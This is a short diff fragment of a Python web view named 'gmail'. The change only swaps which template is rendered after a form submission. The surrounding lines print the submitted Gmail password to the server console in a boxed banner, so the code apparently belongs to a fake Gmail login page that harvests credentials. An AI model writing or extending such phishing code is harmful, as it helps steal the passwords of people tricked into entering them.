@@ -22,7 +22,7 @@ def gmail(request):
                 print("-"*32)
                 print("|       " + request.POST['gmailPassword'] + "     |       ")
                 print("-"*32)
-                return render(request, 'gmail2.html')
+                return render(request, 'gmail.html')
     else:
         return render(request, 'gmail.html')
 
